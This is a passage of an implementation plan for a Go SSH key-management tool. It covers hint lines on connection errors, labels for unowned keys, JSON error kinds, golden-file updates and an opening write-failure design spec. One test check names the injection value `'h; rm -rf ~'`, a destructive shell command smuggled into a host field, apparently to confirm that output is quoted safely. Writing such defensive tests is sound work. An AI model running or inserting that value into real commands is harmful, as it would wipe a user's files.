**Files:** `internal/sshconn/hostkey.go` (`:25-58`), `internal/sshconn/sshconn_test.go` (`TestHostKeyHint`, `:197-246`), `internal/sshconn/connect_test.go` (host-key table `:115-140`), `internal/sshread/integration_test.go` (`:91`), `internal/audit/drift_classes_test.go` (`errorKindResults`, `:51-57`), goldens `report_error_kinds.golden{,.json}`.

- [ ] **Step 1: Failing test.** In `TestHostKeyHint`, change each subtest to assert `!strings.Contains(err.Error(), "hint:")` and `!strings.ContainsAny(err.Error(), "\n")`, and move the existing content checks (`ssh-keyscan -t ed25519 -p 22 '10.0.0.1' | ssh-keygen -lf -`, `ssh_host_ed25519_key.pub`, `'h; rm -rf ~'`, `HOST KEY CHANGED`, `not recorded in known_hosts`, the recorded types) onto `audit.HintOf(err)`. Keep `presented ssh-ed25519 key SHA256:` on `err.Error()`: that is the error, not the hint. In the `connect_test.go` table, check `want`/`notWant` against `err.Error() + "\n" + audit.HintOf(err)`.
- [ ] **Step 2:** `rtk proxy go test ./internal/sshconn/ -run 'TestHostKeyHint|TestConnectHostKey' -count=1` → FAIL ("hint:" found in the message).
- [ ] **Step 3: Implement.** Each `classify(kind, fmt.Errorf("%w\n  hint: …", err, args…))` in `hostKeyHint` becomes `classifyHint(kind, fmt.Sprintf("…", args…), err)`, keeping the hint wording byte-for-byte without the `"\n  hint: "` prefix. The plain `classify(audit.ErrorKindHostKey, err)` branch (`:42`) is unchanged.
- [ ] **Step 4:** `rtk proxy go test ./internal/sshconn/ ./internal/sshread/ -count=1` → PASS. In `internal/sshread/integration_test.go:91`, switch the check to `strings.Contains(audit.HintOf(err), "| ssh-keygen -lf -")`. `make integration` verifies it.
- [ ] **Step 5: Goldens.** In `errorKindResults`, make web-1 `hintedErr{kindedErr{ErrorKindHostKeyChanged, "ssh deploy@10.0.0.1:22: presented ssh-ed25519 key SHA256:abc: knownhosts: key mismatch"}, "HOST KEY CHANGED for 10.0.0.1:22 — possible impersonation; investigate and verify the new fingerprint out of band before touching ~/.ssh/known_hosts"}`. That is the exact `hostKeyHint` format with `kh.Path` set to `~/.ssh/known_hosts`. Then run `go test ./internal/audit/ -run TestHostKeyChangedIsCritical -update` and review: one new `  hint:` line and one new JSON `"hint"` on web-1, nothing else.

---

#### Task 5: apply/revoke/rotate plan and summary (UX-1, UX-3 apply side)

**Files:**
- Modify: `internal/apply/report.go` (`label` `:63-81`, `Render` unreachable branch `:95-96`, `renderChange` remove rows `:119-122`, `RenderSummary` `:273-289`)
- Modify: `internal/apply/json.go` (`jsonServer` `:92-107`, `jsonKey` `:118-125`, `jsonErrorFor` `:310-330`, `jsonKeyFor` `:336-350`)
- Test: `internal/apply/report_test.go` (`mixedPlans` fixture `:76`, assertion `:94`), `internal/apply/json_test.go`
- Goldens: `plan_mixed.golden`, `plan_mixed_color.golden`, `json_mixed.golden.json`, `json_withheld.golden.json`, and a new `summary_failed_hint.golden`

- [ ] **Step 1: Write the failing tests**

In `report_test.go`, use the real transport error in `mixedPlans`. Package `apply` already imports `sshconn` and `audit`.

```go
// dialRefused is exactly what sshconn returns for a refused TCP connect.
func dialRefused(ip string) error {
	return &sshconn.Error{Kind: audit.ErrorKindDial, Hint: sshconn.DialHint, Err: &net.OpError{Op: "dial", Net: "tcp",
		Addr: &net.TCPAddr{IP: net.ParseIP(ip), Port: 22}, Err: os.NewSyscallError("connect", syscall.ECONNREFUSED)}}
}
```

Set `errs: map[string]error{"web-3": dialRefused("10.0.0.3")}`. In `TestRenderPlanMixedGolden`, change the `want` list to replace `"web-3 (deploy@10.0.0.3:22)  ERROR:"` with these:

```go
		"web-3 (deploy@10.0.0.3:22)  ERROR [dial]: dial tcp 10.0.0.3:22: connect: connection refused\n  hint: " + sshconn.DialHint + "\n",
		`-  (unknown) "stray@laptop"`,
```

Append:

```go
// TestRenderRemoveRowShowsOptions: an unowned key's on-server options ride
// in the remove row's detail cell.
func TestRenderRemoveRowShowsOptions(t *testing.T) {
	cfg := mixedCfg(t)
	r := &fakeReader{byName: map[string]audit.ReadResult{
		"web-1": {Content: []byte(testkeys.Line(t, 2) + " alice@work\n" + testkeys.Line(t, 3) + " bob\n" +
			`command="/bin/backup" ` + testkeys.Line(t, 9) + " backup@nas\n"), SessionKeyFP: fp(t, 2)},
	}}
	plans := buildPlans(t, cfg, r, []string{fp(t, 2)})
	var buf bytes.Buffer
	Render(&buf, cfg, plans, RenderOptions{})
	if !strings.Contains(buf.String(), `(unknown) "backup@nas"`) ||
		!strings.Contains(buf.String(), `remove (unauthorized) · options: "command=\"/bin/backup\""`) {
		t.Errorf("remove row lacks comment/options:\n%s", buf.String())
	}
}

// TestRenderSummaryFailedHint: a phase-2 failure that carries a hint prints
// it once under the first FAILED row.
func TestRenderSummaryFailedHint(t *testing.T) {
	plans := []ServerPlan{
		{Server: config.Server{Name: "a"}, Class: ClassChange, Outcome: OutcomeFailed, OutcomeErr: dialRefused("10.0.0.1")},
		{Server: config.Server{Name: "b"}, Class: ClassChange, Outcome: OutcomeFailed, OutcomeErr: dialRefused("10.0.0.2")},
	}
	var buf bytes.Buffer
	RenderSummary(&buf, plans, RenderOptions{})
	if n := strings.Count(buf.String(), "  hint: "+sshconn.DialHint+"\n"); n != 1 {
		t.Errorf("hint printed %d times, want 1:\n%s", n, buf.String())
	}
	checkGolden(t, "summary_failed_hint.golden", buf.Bytes())
}
```

The former-owner precedence (`alice (revoked)` wins over the comment) is already pinned by `former_test.go:39`. The `(unknown)` count assertion at `:52` keeps holding because the labels still start with `(unknown)`, so `former_test.go` needs no edit.

`json_test.go`:

```go
// TestRenderJSONHintAndRemoveOptions: unreachable and failed servers carry
// the hint beside, never inside, error; remove keys carry on-server options.
func TestRenderJSONHintAndRemoveOptions(t *testing.T) {
	cfg, plans := mixedPlans(t)
	plans = append(plans, ServerPlan{Server: config.Server{Name: "w"}, Class: ClassChange, Outcome: OutcomeFailed, OutcomeErr: dialRefused("10.0.0.7")})
	var buf bytes.Buffer
	if err := RenderJSON(&buf, cfg, plans, JSONOptions{Command: "apply", DryRun: true}); err != nil {
		t.Fatal(err)
	}
	var doc jsonDoc
	if err := json.Unmarshal(buf.Bytes(), &doc); err != nil {
		t.Fatal(err)
	}
	for _, s := range doc.Servers {
		if s.Name != "web-3" && s.Name != "w" {
			if s.Hint != "" {
				t.Errorf("%s: unexpected hint %q", s.Name, s.Hint)
			}
			continue
		}
		if s.ErrorKind != "dial" || s.Hint != sshconn.DialHint || strings.Contains(*s.Error, "hint") {
			t.Errorf("%s: error %q kind %q hint %q", s.Name, *s.Error, s.ErrorKind, s.Hint)
		}
	}
}
```

Extend the existing `TestRenderJSONSanitizes` (`:392`) with a remove key whose options hold `\u202e`, and assert that `options` comes out stripped.

- [ ] **Step 2: Run them and watch them fail**

`rtk proxy go test ./internal/apply/ -run 'TestRenderPlanMixedGolden|TestRenderRemoveRowShowsOptions|TestRenderSummaryFailedHint|TestRenderJSONHintAndRemoveOptions' -count=1` → FAIL (a plain `ERROR:` head, no hint, no `Hint`/`Options` fields).

- [ ] **Step 3: Implement**

`report.go`: at `label` `:75`, `return "(unknown)"` becomes `return audit.UnknownLabel(k)`. The `Former` branch keeps its precedence.

`Render` creates `var hints audit.Hints`, and the unreachable branch becomes:

```go
		case ClassUnreachable:
			tag, alert := audit.ErrorTag(p.Err)
			code := codeRed
			if alert {
				code = codeBoldRed
			}
			fmt.Fprintf(w, "%s  %s %s\n", head, pal.paint(code, tag), oneLine(p.Err))
			hints.Write(w, p.Err)
			fmt.Fprintln(w)
```

In `renderChange`'s remove loop, add a suffix only for keys neither config owns: `detail := "remove (unauthorized)"`, then `if _, ok := cfg.OwnerOf(k.Fingerprint); !ok && !formerOwns(opts, k) { detail += audit.UnknownOptions(k) }`. The helper `formerOwns` sits next to `label`. `RenderSummary` gets its own `var hints audit.Hints` and calls `hints.Write(w, p.OutcomeErr)` after the REFUSED and FAILED rows. The plan report and the summary are separate sections and keep separate dedupe sets, so a hint seen in the plan is printed again at most once in the summary.

`json.go`: add `Hint string \`json:"hint,omitempty"\`` after `ErrorKind` in `jsonServer`, and `Options []string \`json:"options,omitempty"\`` in `jsonKey`. `jsonErrorFor` returns `(*string, kind, hint string)`, with `hint = audit.CleanHint(p.Err)` for unreachable and `audit.CleanHint(p.OutcomeErr)` for change outcomes. Refusals get no hint. In the `p.Remove` loop, when `jk.Owner == nil && jk.FormerOwner == "" && len(k.Options) > 0`, set `jk.Options = cleanAll(k.Options)`.

- [ ] **Step 4: Run the tests and watch them pass**

`rtk proxy go test -race ./internal/apply/ -count=1` → PASS. That includes `TestRenderColorStrippedEqualsPlain`, `TestCountSummaryMatchesRenderSummary` and `former_test.go`.

- [ ] **Step 5: Regenerate and review goldens**

`go test ./internal/apply/ -update -count=1`, then `git diff internal/apply/testdata/`. Expected deltas:
- `plan_mixed*.golden`: `-  (unknown) "stray@laptop"` (columns re-padded), `ERROR [dial]: dial tcp 10.0.0.3:22: connect: connection refused` plus the hint line.
- `json_mixed.golden.json`, `json_withheld.golden.json`: web-3 `"error"` loses nothing but gains `connect:`; `"error_kind": "dial"`; new `"hint"`.
- `summary_failed_hint.golden`: new.

`edit_*.golden` and the other `json_*`/`summary_*` goldens must be unchanged. P06 owns `edit_*`, and if they move, stop and report.

---

#### Task 6: Real-binary checks and the README source of truth (cmd)

**Files:** `cmd/sshepherd/audit_hermetic_test.go`, `cmd/sshepherd/json_cmd_test.go`

- [ ] **Step 1: Failing tests.** Append to `audit_hermetic_test.go`:

```go
// TestAuditClosedPortsHintOnce: the real transport through the real CLI —
// two refused servers give two clean [dial] heads, one hint line, and
// stderr warn lines without the hint. Its stdout is the README's source for
// real dial-error samples.
func TestAuditClosedPortsHintOnce(t *testing.T) {
	fakeAgent(t)
	kh := writeEmptyKnownHosts(t)
	p1, p2 := closedPort(t), closedPort(t)
	path := writeConfig(t, fmt.Sprintf(`
users:
  - {name: alice, keys: ["%s"]}
servers:
  - {name: web-1, host: 127.0.0.1, port: %d, user: deploy}
  - {name: web-2, host: 127.0.0.1, port: %d, user: deploy}
access:
  - {user: alice, servers: [web-1, web-2]}
`, testkeys.Line(t, 1), p1, p2))
	var out, errBuf bytes.Buffer
	if code := run([]string{"audit", "--config", path, "--known-hosts", kh}, &out, &errBuf); code != 1 {
		t.Fatalf("exit = %d, want 1\n%s\n%s", code, out.String(), errBuf.String())
	}
	for _, p := range []int{p1, p2} {
		want := fmt.Sprintf("ERROR [dial]: dial tcp 127.0.0.1:%d: connect: connection refused\n", p)
		if !strings.Contains(out.String(), want) {
			t.Errorf("stdout lacks %q:\n%s", want, out.String())
		}
	}
	if n := strings.Count(out.String(), "  hint: "+sshconn.DialHint+"\n"); n != 1 {
		t.Errorf("hint printed %d times on stdout, want 1:\n%s", n, out.String())
	}
	if strings.Contains(errBuf.String(), "hint") {
		t.Errorf("live warn lines must not repeat the hint:\n%s", errBuf.String())
	}
	t.Logf("README sample source:\n%s", out.String())
}
```

In `TestAuditInterruptedMidFanOutExits3` (`:158`), add `if strings.Contains(errBuf.String(), "warn:") { t.Errorf(…) }`. In `TestApplyJSONSkipped` (`json_cmd_test.go:130`), add:

```go
	if s := docServers(doc); s[0]["error_kind"] != "dial" || s[0]["hint"] != sshconn.DialHint ||
		strings.Contains(s[0]["error"].(string), "hint") || strings.Count(s[0]["error"].(string), "dial") != 1 {
		t.Errorf("web-1 error/hint = %v / %v", s[0]["error"], s[0]["hint"])
	}
```

- [ ] **Step 2:** `rtk proxy go test ./cmd/sshepherd/ -run 'TestAuditClosedPortsHintOnce|TestAuditInterruptedMidFanOutExits3|TestApplyJSONSkipped' -count=1`. These FAIL before Tasks 2 and 3 land and PASS after. They are verification tests for the earlier tasks, so the run order is: write them, see them fail against the pre-change tree, then re-run after merging.
- [ ] **Step 3:** `rtk proxy go test -race ./cmd/sshepherd/ -count=1`. One **known cross-package break**: `cmd/sshepherd/apply_test.go:130` asserts `"ERROR:"`, but output is now `"ERROR [dial]:"`. P06 owns that file. The fix is to change the literal to `"ERROR [dial]:"`, and the wave-1 integrator applies it as a one-line merge stitch (see Conflicts).

---

#### Task 7: ARC-3 bug — write-phase failures keep their `error_kind` (moved here from P14 S1)

**Files:**
- Modify: `internal/apply/json.go` (`jsonErrorFor`, `:306-330`)
- Test: `internal/apply/json_test.go` (append), `internal/sshwrite/sshwrite_test.go` (append one contract test; P07 owns this file in W1 for that test only)

- [ ] **Step 1: Write the failing test** (`internal/apply/json_test.go`; `audit` is already imported, add `"fmt"`)

```go
// writeKindErr stands in for a classified transport error (sshconn.Error)
// that reaches a plan's OutcomeErr through sshwrite's wrappers.
type writeKindErr struct{ kind audit.ErrorKind }

func (e writeKindErr) Error() string             { return "ssh deploy@10.0.0.1:22: knownhosts: key mismatch" }
func (e writeKindErr) ErrorKind() audit.ErrorKind { return e.kind }

// TestJSONErrorKindWritePhase: a write-phase failure keeps the kind the
// transport attached (ARC-3), so a host key that changed between plan and
// write is distinguishable from an ordinary verify failure. Unclassified
// write errors and refusals keep no kind, so existing documents are unchanged.
func TestJSONErrorKindWritePhase(t *testing.T) {
	tests := []struct {
		name string
		p    ServerPlan
		want string
	}{
		{"host key changed at write connect", ServerPlan{Server: srv("a"), Class: ClassChange, Outcome: OutcomeFailed,
			OutcomeErr: fmt.Errorf("write on a: %w", writeKindErr{audit.ErrorKindHostKeyChanged})}, "host_key_changed"},
		{"dial at write connect", ServerPlan{Server: srv("a"), Class: ClassChange, Outcome: OutcomeFailed,
			OutcomeErr: writeKindErr{audit.ErrorKindDial}}, "dial"},
		{"unclassified verify failure", ServerPlan{Server: srv("a"), Class: ClassChange, Outcome: OutcomeFailed,
			OutcomeErr: errors.New("verify failed")}, ""},
		{"refusal", ServerPlan{Server: srv("a"), Class: ClassChange, Outcome: OutcomeRefused,
			OutcomeErr: errors.New("target is a symlink")}, ""},
		{"interrupted pending", ServerPlan{Server: srv("a"), Class: ClassChange, Outcome: OutcomePending,
			OutcomeErr: errInterrupted}, "canceled"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			msg, kind, _ := jsonErrorFor(tt.p) // P07 Task 5's signature: (*string, kind, hint string)
			if msg == nil || kind != tt.want {
				t.Errorf("jsonErrorFor = (%v, %q), want kind %q", msg, kind, tt.want)
			}
		})
	}
}
```

Contract test, appended to `internal/sshwrite/sshwrite_test.go`. It proves the kind survives `connectForWrite`'s `sshconn.SanitizedError` wrapping (`sshwrite.go:481`). Reuse the file's existing request and server helpers (`:596`):

```go
func TestApplyConnectErrorKeepsKind(t *testing.T) {
	w := &FleetWriter{connect: func(context.Context, config.Server, sshconn.ConnectOptions) (*sshconn.Conn, error) {
		return nil, &sshconn.Error{Kind: audit.ErrorKindHostKeyChanged, Err: errors.New("knownhosts: key mismatch")}
	}}
	err := w.Apply(context.Background(), config.Server{Name: "a", Host: "10.0.0.1", Port: 22, User: "deploy"},
		Request{Content: []byte("x\n"), Survivors: []string{"SHA256:x"}})
	if got := audit.ErrorKindOf(err); got != audit.ErrorKindHostKeyChanged {
		t.Fatalf("ErrorKindOf(%v) = %q, want host_key_changed", err, got)
	}
}
```

- [ ] **Step 2: Run to see it fail**

`rtk proxy go test ./internal/apply/ -run TestJSONErrorKindWritePhase -count=1`. Expected: FAIL on the first two cases, `kind ""` where `host_key_changed` and `dial` are wanted. The sshwrite test should already PASS, because it pins the precondition.

- [ ] **Step 3: Implement** (`internal/apply/json.go`, the `ClassChange` branch)

```go
	case ClassChange:
		if p.OutcomeErr != nil {
			msg := cleanLine(p.OutcomeErr.Error())
			if p.Outcome == OutcomePending && errors.Is(p.OutcomeErr, errInterrupted) {
				return &msg, string(audit.ErrorKindCanceled), 
			}
			// A transport-classified failure (host key changed at the
			// write connect, auth, timeout…) keeps its kind; refusals and
			// unclassified write/verify errors carry none, as before.
			hint := audit.CleanHint(p.OutcomeErr)
			if k := audit.ErrorKindOf(p.OutcomeErr); k != audit.ErrorKindUnknown {
				return &msg, string(k), hint
			}
			return &msg, "", hint
		}
```

Update the doc comment above `jsonErrorFor` to say so. Note: a `LockoutError` unwraps to its probe error (`sshwrite.go:311`), so a lockout whose probe was refused reports `"auth"`. That is accurate, and it is the hook P08-impl's `lockout_unrestored` outcome builds on.

- [ ] **Step 4: Run to see it pass**

`rtk proxy go test ./internal/apply/ ./internal/sshwrite/ -count=1`, then `go test ./... -count=1`. Goldens are unchanged: `json_outcomes.golden.json` server `c` is an unclassified `errors.New`.

- [ ] **Step 5: Docs (integrator)**

In README's apply/revoke/rotate **JSON** paragraph (`README.md:~573-580`), after the `"canceled"` sentence, add: "A write that fails after the plan carries `error_kind` when the transport classified the failure (for example `host_key_changed` when the host key changed between plan and write, `auth`, `timeout`). Refusals and verify failures carry none." No golden change.

**Ordering inside P07:** do this task after Task 5 (which gives `jsonErrorFor` its three return values). `internal/sshwrite/sshwrite_test.go` is owned by the P07 lane in W1 for this one appended test (no other W1 package touches it; P03 had it in W0, P11 takes it in W2).

---

#### Task 8: H1 — show `RewriteRow.Widens` (moved here from the W1 integrator by the review panel)

P05 Task 3 adds `Widens []string` to `RewriteRow` in `internal/apply/plan.go` (P05's file). **Frozen contract:** `RewriteRow.Widens []string` holds the relaxing options the rewrite adds (`no-touch-required`, and `pty`/`port-forwarding`/… under `restrict`). In this lane's worktree, add the field locally to `plan.go` so the code compiles; the lane's ownership filter drops that `plan.go` hunk from the patch, and P05's real field takes its place at merge.

**Files:** `internal/apply/report.go`, `internal/apply/report_test.go`, `internal/apply/json.go`, `internal/apply/json_test.go`, `internal/apply/testdata/json_*.golden.json`.

- [ ] **Step 1: Failing test** in `report_test.go`: a plan with `Rewrites: []RewriteRow{{Key: testKey(t, 1), Widens: []string{"no-touch-required"}}}` renders a line containing `adds relaxing option(s) "no-touch-required"`. In `json_test.go`: the same plan's document has `"widens": ["no-touch-required"]`, and a rewrite with no widening has `"widens": []`.
- [ ] **Step 2: Run, expect FAIL** (`go test ./internal/apply/ -run 'Widens'`): the line and the field are missing.
- [ ] **Step 3: Implement:**

```go
// internal/apply/report.go, the rewrite row paint (currently line 127):
		if len(rw.Loosens) > 0 || len(rw.Widens) > 0 {
// after the existing Loosens warning loop (currently lines 158-168):
	for _, rw := range p.Rewrites {
		if len(rw.Widens) == 0 {
			continue
		}
		quoted := make([]string, 0, len(rw.Widens))
		for _, o := range rw.Widens {
			quoted = append(quoted, fmt.Sprintf("%q", o))
		}
		fmt.Fprintf(w, "  %s the rewrite of %s's key adds relaxing option(s) %s — the manifest line grants more than the server does today\n",
			pal.paint(codeBoldRed, "warning:"), label(cfg, opts, rw.Key), strings.Join(quoted, ", "))
	}
// internal/apply/json.go jsonRewrite: Widens []string `json:"widens"` (always present, like loosens),
// filled with cleanAll(rw.Widens) in jsonRewriteFor.
```

- [ ] **Step 4: Run, expect PASS**, then regenerate the `json_*.golden.json` files that hold a rewrite (each gains `"widens": []`) with `go test ./internal/apply/ -run Golden -update`, and read every diff back by eye. Hand the integrator the README JSON sample delta (README ~line 664 gains `"widens": []`, copied from the golden) and a one-paragraph amendment for `docs/superpowers/specs/2026-11-07-apply-json-design.md` describing the new `widens` field.

#### Integrator: README / docs / CLAUDE.md (same commit)

Every sample is copied from the regenerated goldens. None is hand-written.
- `README.md:13-24` (hero): re-copy `internal/audit/testdata/report_drift.golden` (the `(unknown) "who@is-this"` row, the `ERROR [dial]` head and the hint line).
- `README.md:162-176` (apply sample): re-copy `internal/apply/testdata/plan_mixed.golden`. Keep the trailing `apply 1 of 4 servers? [y/N]` line as-is: it is from the prompt, not the golden.
- `README.md:376-382` and `:400-440` (error-kinds text and JSON): re-copy `report_error_kinds.golden{,.json}` if Task 4 landed.
- `README.md:640-725` (apply JSON sample): re-copy `json_mixed.golden.json`. web-3 gets `"error_kind": "dial"` and `"hint"`, which fixes the current `"unknown"` mismatch.
- `README.md:369-374`: add one sentence: "When a failure has a remediation, it prints on its own `hint:` line under the first server that needs it. A hint shared by many servers prints once."
- `README.md:446-452` (audit JSON optional fields): add `servers[].hint` ("remediation text, present only when the failure has one; `error` never contains it") and `keys.unauthorized[].options` ("on-server options of a key the manifest does not own").
- `README.md:735` (apply JSON): the same two fields (`servers[].hint`, `changes.remove[].options`).
- The audit-report section: one sentence saying that a key the manifest does not own shows as `(unknown)` with its on-server comment (quoted, sanitized, cut at 40 characters) and, in the status cell, its options.
- Specs: add an amendment paragraph to `2026-07-16-audit-json-exit-codes-design.md` and `2026-11-07-apply-json-design.md` covering the additive `hint` and `options` fields (schema stays 1), and to `2026-07-06-audit-slice-design.md:247` covering the `(unknown)` label, which now carries the comment.
- `CLAUDE.md` Status: one sentence. "Reports name unowned keys by on-server comment/options, connection errors carry their remediation as a separate `hint` (text: once per distinct hint; JSON: additive `hint`), and Ctrl-C stops audit's fan-out without dialing queued servers."

#### Risks and how to verify

- **Golden churn hides a regression.** Every `-update` is followed by a `git diff` review against the expected deltas listed in each task. The verifier re-checks that no unlisted golden moved.
- **Column alignment.** A quoted comment widens the label column. It is capped at 40 runes, `%q` neutralizes tabs, and `TestRenderColorStrippedEqualsPlain` in both packages still pins alignment.
- **Hostile text.** Comments, options and hints go through `sanitize.Remote` plus `%q`. The new tests carry ESC and U+202E. Hints are built locally but include the configured host and the `--known-hosts` path.
- **adopt loses the dial/host-key hint in the interim.** `internal/adopt/adopt.go:70` builds `Issue.Detail` from `r.Err.Error()`, which no longer contains the hint. P05 owns that file in wave 1. Follow-up F-P07-1 (below) restores it in wave 2. Until then, adopt prints the clean error without the hint. That is a small, temporary loss, and it is listed in the wave-1 commit message.
- **Cancellation kind.** A pre-canceled `canceledResult` wraps `ctx.Err()`, so a parent deadline (rare) classifies as `timeout`, not `canceled`. It still warns, which is correct: no Ctrl-C happened.
- **E2E/integration.** `make integration` runs the dockerized sshd matrix, which covers real host-key and dial paths, including `internal/sshread/integration_test.go:91` from Task 4. The E2E loop in `cmd/sshepherd/e2e_test.go` must stay green unchanged. Its owner is P13, and no string it asserts changes, which the integrator confirms by running it.

#### Follow-ups this package creates (for the program plan)

- **F-P07-1 (wave 2, attach to P12, which owns `cmd/sshepherd/adopt.go`; it also needs `internal/adopt/adopt.go` once P05 is done):** `adopt.Issue` gains `Hint string` (`audit.CleanHint(r.Err)`), and `reportUnreadable` (`cmd/sshepherd/adopt.go:179-201`) prints each distinct hint once after the issue lines. Test: an `adopt` run against two closed ports shows one `hint:` line on stderr.
- **Bastion wording:** `sshconn.DialHint` says "jump hosts are not supported yet". If the owner approves D23 (`via:`), that slice updates the constant and regenerates the goldens and README in one go. The guard test `TestAuditGoldenCarriesDialHint` makes the drift fail loudly.
- **Former owner in a standalone audit** (the UX-1 fix text: "tag keys owned by a user in the last committed or former manifest"): audit has no former manifest. Revocation memory is D1/PRD-1, in P04's spec. Once a `revoked:` list exists, audit can label `(unknown)` keys as `alice (revoked)`. Not planned here.

#### Acceptance

```sh
gofmt -l . && goimports -l .                      # prints nothing
rtk proxy go test -race -count=1 ./internal/audit/ ./internal/apply/ ./internal/sshconn/ ./internal/sshread/ ./cmd/sshepherd/
go test ./internal/audit/ ./internal/apply/ -count=1   # goldens match without -update
make check                                        # tidy fmt vet lint deadcode security coverage (≥ COVERAGE_MIN)
make integration                                  # dockerized sshd matrix incl. sshread host-key hint
git diff --stat -- internal/apply/plan.go internal/apply/plan_test.go internal/adopt/ cmd/sshepherd/apply.go  # empty
grep -n 'hint' README.md | head                   # hint field documented; samples match goldens
```

The verifier also diffs every README sample block named above against its golden file, byte for byte.

#### Out of scope

- `editrun.go` hint problems (`applyHint` without `--known-hosts`/`--identity`, `printScope` ignoring `--config`, the `--no-apply` list that includes emptied servers). These are cited in the UX-3 verifier note but live in P06's files.
- A `revoked:` list, or audit labeling keys by former owner (D1/D2, P04).
- Bastion/jump-host support (D23). Only the hint text is touched.
- Any change to `plan.go` (P05), to exit codes, or to the `canceled` / exit-3 interrupt contract in `cmd/sshepherd` (which stays as it is).
- On-hold items (prune, apply --force, import --prefer, key generation/scheduled rotation, move-key, apply wipe mode): no overlap.
- Moving `ErrorKind`/`Hinted` into `internal/fleet`. That is P14's (wave 3), and the helpers here are designed so it can move them unchanged.

---

### P08 — Spec: write-path failure semantics (probe failure, lockout exit code, stale locks, watchdog, backup retention)

> **Program notes (master plan):** Spec only; implementation is W5+ after P11 and P14. Decisions are asked D9 → D10 → D12 → D11 → D13.

- **Kind:** spec (writes one design doc; no code, no tests, no commit by the agent)
- **Wave:** 1 (the spec). The implementation it unlocks, **P08-impl**, goes in a wave **after P14 (wave 3) and P04-impl (wave 4)**, so wave 5 or later.
- **Depends on:** nothing for the spec. P08-impl depends on P07 (owns `internal/apply/report.go`, `json.go` and goldens in W1), P11 (rewrites `writeCmdFor`/`lockPrologue` for WP-3/4/9 in W2), P13 (`internal/sshwrite/fuzz_test.go`, `scripts/integration.sh` in W2) and P14 (moves error kinds to `internal/fleet` and the run body to `internal/workflow` in W4).
- **Owner decisions:** D9, D9b, D10 (asked one at a time, in short, simple English, each with its recommendation); D11, D12, D13 are stated decisions the owner can override at spec approval. The spec's status stays `Draft — awaiting D9, D9b, D10` until all three are answered.
- **Files owned:** `docs/superpowers/specs/2026-11-08-write-failure-semantics-design.md` (new). Nothing else.

#### Findings covered

| ID | Sev | One line |
|---|---|---|
| WP-1 | MEDIUM | Any failed login check rolls the server back, including a dial timeout, MaxStartups, rate limiting or a locked agent. During `revoke` (manifest already saved) that can put the revoked key back (`internal/sshwrite/sshwrite.go:542-551`, `591-595`). |
| WP-2 | LOW | The safety net lives only in the client. A second signal, SIGKILL after a container grace period, a transport drop after the upload (`sshwrite.go:385-388`) or a verify error (`sshwrite.go:396`) all leave the new file in place with no login check. |
| WP-6 | LOW | "Probe failed AND restore failed" exits 1, the same as harmless drift (`internal/apply/plan.go:588-600`). JSON has no field for it (`internal/apply/json.go:283-288`, `310-329`), and a restore refused by a busy lock (exit 47) is never retried (`sshwrite.go:583-584`). |
| WP-7 | LOW | The lock is a bare `mkdir` (`sshwrite.go:147`) with no owner or time. A stale lock blocks every later write, and `LockedError` (`sshwrite.go:287-293`) cannot say who left it or when. |
| WP-8 | LOW | `disableKeys2Cmd` runs `rm -f "$s"` before `mv` (`sshwrite.go:247`), so an earlier disabled copy is destroyed. A plan that only disables keys2 (`plan.go:213-216`) still rewrites `authorized_keys` and rotates `.bak` (`sshwrite.go:205`), which loses the useful one-step undo. |

#### Why this is a spec and not a fix

Each item reverses or extends a documented, owner-approved decision:

- WP-1 reverses `docs/superpowers/specs/2026-10-16-review-hardening-design.md:260-263` ("That holds for network failures too: if access cannot be proven, the server goes back to its previous file").
- WP-6 uses exit 2, which README:1346-1349 and the `ExitCode` comment (`plan.go:588-593`) say apply never returns.
- WP-7 changes README:1411-1413 ("A lock left behind by a killed remote shell must be removed by hand").
- WP-2 touches README:760-767 (Ctrl-C contract) and README:1420-1421 ("a dropped connection leaves the original untouched"), which WP-2 (3) shows is not always true.
- WP-8 changes the `authorized_keys2.sshepherd.disabled` name the plan row prints (`internal/apply/report.go:137-140`, goldens `plan_security*.golden`) and the README Backups / authorized_keys2 paragraphs (README:1423-1434).

#### On-hold overlap check

- **apply wipe/empty-server mode:** not touched. Restore after a REJECTED probe still removes the file a first-contact write created (`restoreCmdFor`, `wasAbsent`, `sshwrite.go:232-234`). That is a rollback, not a wipe mode.
- **apply --force:** not touched. The spec must state that a stale lock is **never** broken automatically and that no `--break-lock`/`--force` flag is added (D11 option 1). The tool only prints the removal command.
- **prune, import --prefer, key generation/scheduled rotation, move-key:** no overlap.

#### Design questions (one owner decision each)

| Decision | Question (as it goes to the owner) | Recommendation |
|---|---|---|
| **D9** (WP-1) | If the login check after a write can't even log in because of the network (the server never answered), should SSHepherd undo the write? | Retry a few times. If it still can't log in, keep the new file and report UNPROVEN (exit 1). Anything that goes wrong *after* login (a forced command, a hang, a refused session) still undoes the write. |
| **D9b** (WP-5 follow-up, from P11) | Should the login check also try your `--identity` key on its own, and only warn (never undo) if that fails? | Yes, warn only, and only for key files whose line has no restrictions. |
| **D10** (WP-6) | If the login check fails and the undo also fails, so you might be locked out, should apply exit 2 so monitoring pages you? | Yes (follows D28's meaning of exit 2). Also retry the undo when the lock is busy. |

**Stated decisions (not asked; recorded in the spec, and the owner can override at spec approval):**
- **D11** (WP-7): a lock records who and when, its age is shown, and the exact removal command is printed. It is never removed automatically. This is today's behavior plus diagnostics.
- **D12** (WP-2): no server-side watchdog (it goes against the agentless design). Print a notice on the first Ctrl-C, and after a broken connection reconnect (under the lock) and re-check.
- **D13** (WP-8): restore what README already promises. A moved-aside `authorized_keys2` gets a name that is never overwritten, and `authorized_keys` is not rewritten (so `.bak` is not rotated) when its bytes already match.

Ask order: D9 → D9b → D10. D10's meaning depends on D9 (with D9 option 1, a lockout can only follow a REJECTED probe) and on D28 (Block 1).

#### Recommended design sketch (what the spec writes down)

##### 1. Sorting probe failures (D9, WP-1)

`probe()` (`sshwrite.go:591-605`) already returns classified errors. `sshconn.Error.Kind` comes from `internal/sshconn/errors.go:41-56`, and P14 moves it to `fleet.ErrorKindOf`. A new pure function sorts each failure into one of two verdicts **by stage, not by error kind** (review panel, security-writepath): the dividing line is "did authentication finish?". The static guard only checks that a held key's line is present; it never evaluates `from=` or `command=`, and it only warns when every survivor is restrictive. That is why the probe exists, so nothing after a successful login may be waved through as a blip.

| Stage of the probe failure | Examples | Verdict | Action |
|---|---|---|---|
| **Before auth finished:** dial, kex/handshake (MaxStartups, `kex_exchange_identification`), an agent `Signers` failure, `timeout` during dial/handshake | `connect.go:152,195`, `errors.go:41-63` | **TRANSIENT** | Retry with backoff, then UNPROVEN. |
